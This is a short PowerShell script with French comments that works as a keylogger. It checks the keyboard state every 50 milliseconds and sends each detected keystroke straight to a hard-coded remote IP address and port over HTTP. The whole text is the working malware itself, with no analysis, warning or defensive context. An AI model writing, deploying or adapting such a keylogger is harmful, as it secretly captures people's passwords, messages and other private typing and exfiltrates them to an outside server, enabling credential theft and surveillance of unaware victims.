$serverUrl = "http://20.121.45.132:8080"

# Fonction pour envoyer les données au serveur
function Send-Data {
    param ([string]$data)
    $body = @{ "data" = $data }
    Invoke-WebRequest -Uri $serverUrl -Method GET -Body $body
}

# Boucle pour capturer et envoyer les frappes immédiatement
while ($true) {
    Start-Sleep -Milliseconds 50
    for ($key = 8; $key -le 254; $key++) {
        $state = [Windows.Input.Keyboard]::IsKeyDown($key)
        if ($state) {
            $char = [char]$key
            # Envoi immédiat de chaque frappe
            Send-Data -data $char
        }
    }
}
